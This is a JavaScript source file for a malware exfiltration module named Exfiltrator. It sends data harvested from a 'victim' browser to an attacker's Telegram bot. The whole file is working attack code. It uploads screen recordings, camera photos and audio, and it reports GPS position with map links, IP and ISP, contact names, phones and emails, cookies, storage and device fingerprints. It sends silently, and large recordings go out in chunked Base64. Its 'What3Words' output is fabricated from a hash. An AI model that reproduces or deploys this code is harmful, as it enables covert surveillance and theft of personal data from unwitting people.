// exfiltrators/telegram.js — FULL VERSION WITH ALL FEATURES

export class Exfiltrator {
    constructor(config) {
        this.config = config;
        this.botToken = config.botToken;
        this.chatId = config.chatId;
        this.apiUrl = `https://api.telegram.org/bot${this.botToken}`;
        this.fallbackUrl = config.fallbackUrl || null;
        this.name = 'Telegram';
        this.victimId = config.victimId || 'Unknown';
        this.CHUNK_SIZE = 3500; // Safe under Telegram's 4096 limit
    }

    // ============================================
    // MAIN SEND METHODS
    // ============================================

    async sendData(collectorName, data) {
        // Special handling for screen recorder with file upload
        if (collectorName === 'screenRecorder' && data.type === 'file' && data.blob) {
            return this.sendFile(data.blob, {
                duration: data.duration,
                size: data.size,
                format: data.format,
                victimId: this.victimId,
                timestamp: data.timestamp
            });
        }
        
        // Special handling for chunked data
        if (collectorName === 'screenRecorder' && data.chunks && data.totalChunks > 1) {
            return this.sendChunkedVideo(data);
        }
        
        // Regular data
        let message = this.formatDataMessage(collectorName, data);
        return this.sendMessage(message);
    }

    async sendFile(blob, metadata = {}) {
        try {
            const formData = new FormData();
            formData.append('chat_id', this.chatId);
            formData.append('document', blob, `recording-${Date.now()}.webm`);
            
            let caption = `🎬 *Screen Recording*\n`;
            caption += `⏱️ Duration: ${metadata.duration || '?'}s\n`;
            caption += `📊 Size: ${(blob.size / 1024 / 1024).toFixed(2)} MB\n`;
            caption += `📐 Format: ${metadata.format || 'WebM'}\n`;
            caption += `🆔 ID: ${metadata.victimId || this.victimId || 'Unknown'}\n`;
            caption += `⏰ Time: ${new Date(metadata.timestamp || Date.now()).toLocaleString()}\n`;
            caption += `🔗 Source: ${window.location.href || 'Unknown'}`;
            
            formData.append('caption', caption);
            
            const response = await fetch(`${this.apiUrl}/sendDocument`, {
                method: 'POST',
                body: formData,
                cache: 'no-store'
            });
            
            const result = await response.json();
            
            if (!result.ok) {
                throw new Error(result.description || 'Upload failed');
            }
            
            console.log('✅ File uploaded successfully to Telegram');
            return true;
            
        } catch (error) {
            console.error('File upload failed:', error);
            
            // Fallback: Try chunked text if file upload fails
            if (metadata.fallbackData) {
                console.log('Falling back to chunked text...');
                return this.sendChunkedVideo({
                    chunks: this.chunkBase64(metadata.fallbackData, this.CHUNK_SIZE),
                    totalChunks: Math.ceil(metadata.fallbackData.length / this.CHUNK_SIZE),
                    duration: metadata.duration,
                    size: metadata.size
                });
            }
            
            return false;
        }
    }

    async sendChunkedVideo(videoData) {
        // Send metadata first
        await this.sendMessage(
            `🎬 *SCREEN RECORDING (CHUNKED)*\n\n` +
            `📦 Total Chunks: ${videoData.totalChunks}\n` +
            `⏱️ Duration: ${videoData.duration}s\n` +
            `📊 Size: ${(videoData.size / 1024 / 1024).toFixed(2)} MB\n` +
            `🆔 ID: ${this.victimId || 'Unknown'}\n` +
            `⏰ Time: ${new Date().toLocaleString()}\n\n` +
            `_Sending ${videoData.totalChunks} chunks..._\n` +
            `_⚠️ Reassemble in order to get the video_`
        );

        // Send each chunk
        let successCount = 0;
        for (let i = 0; i < videoData.chunks.length; i++) {
            const chunk = videoData.chunks[i];
            const chunkMessage = 
                `📹 *CHUNK ${i+1}/${videoData.totalChunks}*\n\n` +
                `${chunk}`;
            
            const sent = await this.sendMessage(chunkMessage);
            if (sent) successCount++;
            
            // Delay between chunks to avoid rate limiting
            if (i < videoData.chunks.length - 1) {
                await this.delay(500);
            }
        }

        // Send completion
        await this.sendMessage(
            `✅ *RECORDING COMPLETE*\n` +
            `📦 Sent ${successCount}/${videoData.totalChunks} chunks\n` +
            `📊 Total size: ${(videoData.size / 1024 / 1024).toFixed(2)} MB\n\n` +
            `_To reassemble:_\n` +
            `1. Copy all chunks in order\n` +
            `2. Concatenate the Base64 strings\n` +
            `3. Decode Base64 to get the video file_`
        );

        return successCount === videoData.totalChunks;
    }

    // ============================================
    // SUMMARY & ERROR METHODS
    // ============================================

    async sendSummary(collectedData) {
        let message = `🎯 *FULL DATA SUMMARY*\n\n`;
        message += `🆔 *ID:* ${collectedData.id}\n`;
        message += `⏰ *Time:* ${new Date(collectedData.timestamp).toLocaleString()}\n`;
        message += `🔗 *URL:* ${collectedData.campaign?.url || 'Unknown'}\n\n`;
        
        // Device info
        if (collectedData.device) {
            const d = collectedData.device;
            message += `📱 *Device:* ${d.deviceType} - ${d.browser} on ${d.os}\n`;
            message += `🖥️ *Screen:* ${d.screen?.width}x${d.screen?.height}\n`;
        }
        
        // Network info
        if (collectedData.network) {
            const n = collectedData.network;
            message += `🌐 *IP:* \`${n.ipv4}\`\n`;
            message += `📍 *Location:* ${n.city || 'Unknown'}, ${n.country || 'Unknown'}\n`;
        }
        
        // GPS
        if (collectedData.location?.latitude) {
            const l = collectedData.location;
            message += `🎯 *GPS:* ${l.latitude.toFixed(6)}, ${l.longitude.toFixed(6)}\n`;
            message += `📏 *Accuracy:* ${l.accuracy?.toFixed(2) || 'N/A'}m\n`;
        }
        
        // Media
        if (collectedData.media) {
            const m = collectedData.media;
            if (m.screenshot?.resolution) {
                message += `🖥️ *Screenshot:* ${m.screenshot.resolution}\n`;
            }
            if (m.camera?.resolution) {
                message += `📷 *Front Camera:* ${m.camera.resolution}\n`;
            }
            if (m.microphone?.duration) {
                message += `🎤 *Audio:* ${m.microphone.duration}s\n`;
            }
        }
        
        // Screen Recorder
        if (collectedData.screenRecorder) {
            const sr = collectedData.screenRecorder;
            if (!sr.error) {
                message += `🎬 *Screen Recording:* ${(sr.size / 1024 / 1024).toFixed(2)} MB, ${sr.duration}s\n`;
                if (sr.type === 'file') {
                    message += `   ✅ Uploaded as file\n`;
                } else if (sr.type === 'chunked') {
                    message += `   📦 ${sr.totalChunks} chunks sent\n`;
                }
            } else {
                message += `❌ *Screen Recording:* Failed (${sr.error})\n`;
            }
        }
        
        // Sensors
        if (collectedData.sensors?.battery?.level !== undefined) {
            const b = collectedData.sensors.battery;
            message += `🔋 *Battery:* ${b.level}% ${b.charging ? '⚡' : '🔌'}\n`;
        }
        
        // Contacts
        if (collectedData.contacts?.count > 0) {
            message += `📞 *Contacts:* ${collectedData.contacts.count}\n`;
        }
        
        // Browser
        if (collectedData.browser) {
            const b = collectedData.browser;
            message += `🍪 *Cookies:* ${b.cookies ? 'Yes' : 'No'}\n`;
            message += `📚 *History:* ${b.historyLength || 0} pages\n`;
        }
        
        // Fingerprint
        if (collectedData.fingerprint?.webgl) {
            const f = collectedData.fingerprint;
            message += `🎮 *WebGL:* ${f.webgl?.renderer || 'Unknown'}\n`;
        }
        
        message += `\n📊 *Data Collected:* ${Object.keys(collectedData).filter(k => 
            !['id', 'timestamp', 'campaign'].includes(k)
        ).join(', ')}`;
        
        return this.sendMessage(message);
    }

    async sendError(error) {
        let message = `❌ *ERROR*\n\n`;
        message += `🆔 *ID:* ${error.id || this.victimId || 'Unknown'}\n`;
        message += `💥 *Error:* ${error.message || 'Unknown error'}\n`;
        if (error.stack) {
            message += `\`\`\`\n${error.stack.substring(0, 200)}\n\`\`\``;
        }
        return this.sendMessage(message);
    }

    async notify(event, data) {
        let message = `🚨 *${event}*\n\n`;
        message += `🆔 *ID:* ${data.id || this.victimId || 'Unknown'}\n`;
        message += `⏰ *Time:* ${new Date().toLocaleString()}\n`;
        message += `🔗 *URL:* ${data.url || window.location.href || 'Unknown'}\n`;
        if (data.timestamp) {
            message += `🕐 *Timestamp:* ${new Date(data.timestamp).toLocaleString()}\n`;
        }
        return this.sendMessage(message);
    }

    // ============================================
    // CORE TELEGRAM METHODS
    // ============================================

    async sendMessage(message) {
        try {
            // Truncate if too long (Telegram limit is 4096)
            if (message.length > 4096) {
                message = message.substring(0, 4090) + '\n... _(truncated)_';
            }
            
            const response = await fetch(`${this.apiUrl}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: this.chatId,
                    text: message,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true,
                    disable_notification: true
                }),
                cache: 'no-store'
            });
            
            const data = await response.json();
            
            if (!data.ok) {
                throw new Error(data.description || 'Telegram API error');
            }
            
            return true;
            
        } catch (error) {
            console.error('Telegram send failed:', error);
            
            // Try fallback if available
            if (this.fallbackUrl) {
                return this.sendViaFallback(message);
            }
            
            return false;
        }
    }

    async sendPhoto(photoData, caption = '') {
        try {
            const blob = await fetch(photoData).then(r => r.blob());
            const formData = new FormData();
            formData.append('chat_id', this.chatId);
            formData.append('photo', blob, 'photo.jpg');
            if (caption) formData.append('caption', caption.substring(0, 1024));
            
            const response = await fetch(`${this.apiUrl}/sendPhoto`, {
                method: 'POST',
                body: formData,
                cache: 'no-store'
            });
            
            return (await response.json()).ok;
            
        } catch (error) {
            console.error('Photo send failed:', error);
            return false;
        }
    }

    async sendAudio(audioData, caption = '') {
        try {
            const blob = await fetch(audioData).then(r => r.blob());
            const formData = new FormData();
            formData.append('chat_id', this.chatId);
            formData.append('audio', blob, 'audio.webm');
            if (caption) formData.append('caption', caption.substring(0, 1024));
            
            const response = await fetch(`${this.apiUrl}/sendAudio`, {
                method: 'POST',
                body: formData,
                cache: 'no-store'
            });
            
            return (await response.json()).ok;
            
        } catch (error) {
            console.error('Audio send failed:', error);
            return false;
        }
    }

    // ============================================
    // UTILITY METHODS
    // ============================================

    chunkBase64(base64String, chunkSize) {
        const chunks = [];
        for (let i = 0; i < base64String.length; i += chunkSize) {
            chunks.push(base64String.slice(i, i + chunkSize));
        }
        return chunks;
    }

    async sendViaFallback(message) {
        // WebSocket or REST fallback implementation
        console.warn('Fallback not implemented, message:', message.substring(0, 100));
        return false;
    }

    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    // ============================================
    // DATA FORMATTING
    // ============================================

    formatDataMessage(collectorName, data) {
        let message = `📊 *${collectorName.toUpperCase()} DATA*\n\n`;
        message += `🆔 *ID:* ${data.id || this.victimId || 'Unknown'}\n`;
        message += `⏰ *Time:* ${new Date(data.timestamp || Date.now()).toLocaleString()}\n`;
        
        // Format based on collector type
        switch(collectorName) {
            case 'device':
                message += `📱 *Type:* ${data.deviceType}\n`;
                message += `🖥️ *OS:* ${data.os}\n`;
                message += `🌐 *Browser:* ${data.browser}\n`;
                message += `🖥️ *Screen:* ${data.screen?.width}x${data.screen?.height}\n`;
                message += `💾 *Memory:* ${data.deviceMemory || 'Unknown'} GB\n`;
                message += `⚡ *CPU Cores:* ${data.hardwareConcurrency || 'Unknown'}\n`;
                message += `🕐 *Timezone:* ${data.timezone || 'Unknown'}`;
                break;
                
            case 'network':
                message += `📡 *IP:* \`${data.ipv4}\`\n`;
                if (data.ipv6) message += `📡 *IPv6:* \`${data.ipv6}\`\n`;
                message += `📍 *Location:* ${data.city || 'Unknown'}, ${data.country || 'Unknown'}\n`;
                if (data.isp) message += `🏢 *ISP:* ${data.isp}\n`;
                if (data.connection) {
                    message += `📶 *Connection:* ${data.connection.effectiveType || 'Unknown'}\n`;
                    message += `⬇️ *Download:* ${data.connection.downlink || 'Unknown'} Mbps\n`;
                    message += `⏱️ *Latency:* ${data.connection.rtt || 'Unknown'}ms\n`;
                }
                break;
                
            case 'location':
                if (data.latitude) {
                    message += `🎯 *GPS Location:*\n`;
                    message += `   Latitude: ${data.latitude.toFixed(6)}\n`;
                    message += `   Longitude: ${data.longitude.toFixed(6)}\n`;
                    message += `   Accuracy: ${data.accuracy?.toFixed(2) || 'N/A'}m\n`;
                    if (data.altitude) message += `   Altitude: ${data.altitude}m\n`;
                    
                    message += `\n🗺️ *Maps:*\n`;
                    message += `[Google](${this.generateGoogleMapsLink(data.latitude, data.longitude)}) | `;
                    message += `[OSM](${this.generateOpenStreetMapLink(data.latitude, data.longitude)}) | `;
                    message += `[Bing](${this.generateBingMapsLink(data.latitude, data.longitude)})\n`;
                    message += `📌 *What3Words:* \`${this.generateWhat3Words(data.latitude, data.longitude)}\``;
                } else {
                    message += `📍 *IP Location:* ${data.data?.city || 'Unknown'}, ${data.data?.country || 'Unknown'}`;
                }
                break;
                
            case 'media':
                if (data.screenshot?.resolution) {
                    message += `🖥️ *Screenshot:* ${data.screenshot.resolution}\n`;
                }
                if (data.camera?.resolution) {
                    message += `📷 *Front Camera:* ${data.camera.resolution}\n`;
                }
                if (data.backCamera?.resolution) {
                    message += `📷 *Back Camera:* ${data.backCamera.resolution}\n`;
                }
                if (data.microphone?.duration) {
                    message += `🎤 *Audio:* ${data.microphone.duration}s, ${(data.microphone.size / 1024).toFixed(1)} KB\n`;
                }
                break;
                
            case 'sensors':
                if (data.battery) {
                    message += `🔋 *Battery:* ${data.battery.level}% ${data.battery.charging ? '(⚡)' : '(🔌)'}\n`;
                }
                if (data.orientation) {
                    message += `🧭 *Orientation:* α=${data.orientation.alpha?.toFixed(2) || 'N/A'}°, `;
                    message += `β=${data.orientation.beta?.toFixed(2) || 'N/A'}°, `;
                    message += `γ=${data.orientation.gamma?.toFixed(2) || 'N/A'}°\n`;
                }
                if (data.motion) {
                    message += `⚡ *Motion:* `;
                    message += `ax=${data.motion.acceleration?.x?.toFixed(2) || 'N/A'}, `;
                    message += `ay=${data.motion.acceleration?.y?.toFixed(2) || 'N/A'}, `;
                    message += `az=${data.motion.acceleration?.z?.toFixed(2) || 'N/A'}\n`;
                }
                break;
                
            case 'browser':
                message += `📖 *Title:* ${data.title || 'N/A'}\n`;
                message += `🍪 *Cookies:* ${data.cookies ? 'Yes' : 'No'}\n`;
                message += `📚 *History:* ${data.historyLength || 0} pages\n`;
                if (data.permissions) {
                    message += `🔐 *Permissions:*\n`;
                    for (const [perm, state] of Object.entries(data.permissions)) {
                        message += `   ${perm}: ${state}\n`;
                    }
                }
                message += `💾 *LocalStorage:* ${Object.keys(data.localStorage || {}).length} items\n`;
                message += `💾 *SessionStorage:* ${Object.keys(data.sessionStorage || {}).length} items\n`;
                break;
                
            case 'contacts':
                if (data.status === 'granted') {
                    message += `👥 *Contacts:* ${data.count} found\n`;
                    data.data?.slice(0, 5).forEach((c, i) => {
                        message += `\n*Contact ${i+1}:*\n`;
                        message += `👤 ${c.name}\n`;
                        if (c.phones?.length) message += `📱 ${c.phones.join(', ')}\n`;
                        if (c.emails?.length) message += `📧 ${c.emails.join(', ')}\n`;
                    });
                    if (data.count > 5) message += `\n... and ${data.count - 5} more\n`;
                } else {
                    message += `📞 *Contacts:* ${data.status}`;
                }
                break;
                
            case 'fingerprint':
                if (data.webgl) {
                    message += `🎮 *WebGL Renderer:* ${data.webgl.renderer || 'Unknown'}\n`;
                    message += `🏢 *WebGL Vendor:* ${data.webgl.vendor || 'Unknown'}\n`;
                }
                message += `🔌 *Plugins:* ${data.plugins || 0}\n`;
                message += `📄 *MIME Types:* ${data.mimeTypes || 0}\n`;
                if (data.fonts?.length) {
                    message += `🔤 *Fonts:* ${data.fonts.slice(0, 5).join(', ')}`;
                    if (data.fonts.length > 5) message += ` and ${data.fonts.length - 5} more`;
                    message += `\n`;
                }
                break;
                
            case 'screenRecorder':
                if (data.error) {
                    message += `❌ *Error:* ${data.error}\n`;
                } else if (data.type === 'file') {
                    message += `✅ *Uploaded as File*\n`;
                    message += `⏱️ *Duration:* ${data.duration}s\n`;
                    message += `📊 *Size:* ${(data.size / 1024 / 1024).toFixed(2)} MB\n`;
                    message += `📐 *Format:* ${data.format || 'WebM'}\n`;
                } else if (data.type === 'chunked') {
                    message += `📦 *Chunked Data*\n`;
                    message += `⏱️ *Duration:* ${data.duration}s\n`;
                    message += `📊 *Size:* ${(data.size / 1024 / 1024).toFixed(2)} MB\n`;
                    message += `📦 *Chunks:* ${data.totalChunks}\n`;
                }
                break;
                
            default:
                message += `📦 *Data:* ${JSON.stringify(data, null, 2).substring(0, 500)}`;
        }
        
        message += `\n\n🔗 *Source:* ${data.campaign?.url || window.location.href || 'Unknown'}`;
        return message;
    }

    // ============================================
    // MAP GENERATORS
    // ============================================

    generateGoogleMapsLink(lat, lon) {
        return `https://www.google.com/maps?q=${lat},${lon}&z=15&t=m`;
    }

    generateOpenStreetMapLink(lat, lon) {
        return `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}#map=15/${lat}/${lon}`;
    }

    generateBingMapsLink(lat, lon) {
        return `https://bing.com/maps/default.aspx?cp=${lat}~${lon}&lvl=15`;
    }

    generateWhat3Words(lat, lon) {
        const words = ['apple', 'brave', 'chair', 'dream', 'eagle', 'flame', 'grape', 'house', 'island', 'jazz', 'koala', 'lion'];
        const latHash = Math.abs(Math.floor(lat * 1000)) % words.length;
        const lonHash = Math.abs(Math.floor(lon * 1000)) % words.length;
        const altHash = Math.abs(Math.floor((lat + lon) * 1000)) % words.length;
        return `${words[latHash]}.${words[lonHash]}.${words[altHash]}`;
    }
}